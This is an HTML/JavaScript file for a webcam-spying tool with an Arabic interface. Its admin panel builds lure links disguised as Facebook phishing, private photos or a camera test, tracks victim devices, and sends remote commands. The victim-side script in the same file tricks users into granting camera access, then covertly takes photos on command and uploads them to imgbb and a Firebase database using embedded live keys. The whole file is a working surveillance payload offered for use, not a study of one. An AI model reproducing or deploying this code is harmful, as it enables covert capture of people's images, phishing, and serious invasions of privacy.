<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>DOCTOR OS v4.0 | INTELLIGENCE SYSTEM</title>
    <style>
        :root { --gold: #d4af37; --online: #00ff41; --offline: #ff0000; --bg: #050505; }
        body { background: var(--bg); color: var(--online); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        .admin-layout { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
        .sidebar { background: #0a0a0a; border-left: 2px solid var(--gold); padding: 15px; overflow-y: auto; }
        .device-card { border: 1px solid #222; padding: 10px; margin-bottom: 8px; cursor: pointer; position: relative; border-radius: 5px; }
        .status-dot { width: 12px; height: 12px; border-radius: 50%; position: absolute; left: 10px; top: 15px; border: 1px solid #000; }
        .online { background: var(--online); box-shadow: 0 0 10px var(--online); }
        .offline { background: var(--offline); }
        .main-panel { padding: 20px; overflow-y: auto; }
        .cmd-btn { background: transparent; border: 1px solid var(--online); color: var(--online); padding: 10px; cursor: pointer; font-weight: bold; width: 100%; margin: 5px 0; }
        .cmd-btn:hover { background: var(--online); color: #000; }
        .factory-box { border: 1px dashed var(--gold); padding: 15px; margin-bottom: 20px; background: #0f0f0f; }
        input, select { background: #000; border: 1px solid var(--online); color: var(--online); padding: 10px; width: 90%; margin-bottom: 10px; }
        #gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        img { width: 100%; border: 1px solid #333; border-radius: 5px; }
    </style>
</head>
<body>

<div id="admin-ui" class="admin-layout">
    <div class="sidebar">
        <h3 style="color: var(--gold); text-align: center;">إدارة الأهداف 🛰️</h3>
        <div id="device-list">جاري فحص النطاق...</div>
    </div>
    <div class="main-panel">
        <div class="factory-box">
            <h3>مصنع التلغيم (Payload Factory)</h3>
            <select id="bait-type">
                <option value="fb">صيد حساب فيسبوك</option>
                <option value="view">مشاهدة صور خاصة</option>
                <option value="test">فحص جودة الكاميرا</option>
            </select>
            <button class="cmd-btn" style="border-color: var(--gold); color: var(--gold);" onclick="generateLink()">صناعة رابط التلغيم</button>
            <div id="generated-url" style="margin-top:10px; font-weight:bold; word-break: break-all;"></div>
        </div>

        <div id="control-unit" style="display:none;">
            <h2 id="target-id-header" style="color: var(--gold);">التحكم في الهدف</h2>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <button class="cmd-btn" onclick="sendCommand('capture')">📸 التقاط صورة</button>
                <button class="cmd-btn" onclick="sendCommand('vibrate')">📳 هز الجهاز</button>
                <button class="cmd-btn" onclick="sendCommand('location')">📍 تحديث الموقع</button>
                <button class="cmd-btn" onclick="sendCommand('clear')">🧹 مسح الجلسة</button>
            </div>
            <h4>الصور المستلمة:</h4>
            <div id="gallery"></div>
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
        authDomain: "hkrs5000.firebaseapp.com",
        databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
        projectId: "hkrs5000",
        storageBucket: "hkrs5000.firebasestorage.app",
        messagingSenderId: "273977078526",
        appId: "1:273977078526:web:da9e512c2421c300352baf"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";

    // --- منطق المسؤول (Admin) ---
    let selectedTarget = null;

    function initAdmin() {
        db.ref('devices').on('value', snap => {
            const list = document.getElementById('device-list');
            list.innerHTML = "";
            snap.forEach(child => {
                const d = child.val();
                const isOnline = (Date.now() - (d.lastSeen || 0)) < 15000; // متصل إذا أرسل نبض خلال آخر 15 ثانية
                
                const card = document.createElement('div');
                card.className = "device-card";
                card.innerHTML = `
                    <div class="status-dot ${isOnline ? 'online' : 'offline'}"></div>
                    <b>ID: ${child.key}</b><br>
                    <small>${d.platform || 'Unknown'}</small>
                `;
                card.onclick = () => selectDevice(child.key);
                list.appendChild(card);
            });
        });
    }

    function selectDevice(id) {
        selectedTarget = id;
        document.getElementById('control-unit').style.display = "block";
        document.getElementById('target-id-header').innerText = "تحكم كامل: " + id;
        loadGallery(id);
    }

    function sendCommand(act) {
        if(!selectedTarget) return;
        if(act === 'clear') { db.ref('devices/'+selectedTarget).remove(); return; }
        db.ref('commands/' + selectedTarget).set({ action: act, ts: Date.now() });
    }

    function loadGallery(id) {
        db.ref(`data/${id}/images`).on('value', snap => {
            const gal = document.getElementById('gallery');
            gal.innerHTML = "";
            snap.forEach(img => {
                const el = document.createElement('img');
                el.src = img.val().url;
                gal.appendChild(el);
            });
        });
    }

    function generateLink() {
        const base = window.location.href.split('?')[0];
        const type = document.getElementById('bait-type').value;
        const link = `${base}?mode=bait&type=${type}`;
        document.getElementById('generated-url').innerText = link;
    }

    // --- منطق الضحية (The Bait/Payload) ---
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('mode') === 'bait') {
        document.getElementById('admin-ui').style.display = "none";
        runPayload();
    } else {
        initAdmin();
    }

    async function runPayload() {
        document.body.innerHTML = "<div style='color:white; text-align:center; padding-top:20%;'><h3>جاري تحميل المحتوى... يرجى السماح بالصلاحيات للمتابعة</h3></div>";
        const vID = "V_" + Math.floor(Math.random() * 9000);
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // [الحل الجذري]: إرسال نبضات القلب كل 5 ثوانٍ لضمان الظهور كـ "متصل"
            setInterval(() => {
                db.ref('devices/' + vID).update({
                    lastSeen: firebase.database.ServerValue.TIMESTAMP,
                    platform: navigator.platform
                });
            }, 5000);

            // الاستماع للأوامر العكسية
            db.ref('commands/' + vID).on('value', async snap => {
                const cmd = snap.val();
                if (cmd) {
                    if (cmd.action === 'capture') {
                        const track = stream.getVideoTracks()[0];
                        const cap = new ImageCapture(track);
                        const blob = await cap.takePhoto();
                        let fd = new FormData(); fd.append('image', blob);
                        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {method:'POST', body:fd})
                        .then(r=>r.json()).then(d=> {
                            db.ref(`data/${vID}/images`).push({ url: d.data.url });
                        });
                    }
                    if (cmd.action === 'vibrate') navigator.vibrate(2000);
                    db.ref('commands/' + vID).remove();
                }
            });
        } catch (e) {
            // في حالة الرفض، نسجل الدخول على الأقل كمعلومات
            db.ref('devices/' + vID).set({ platform: "Access Denied", lastSeen: Date.now() });
        }
    }
</script>
</body>
</html>
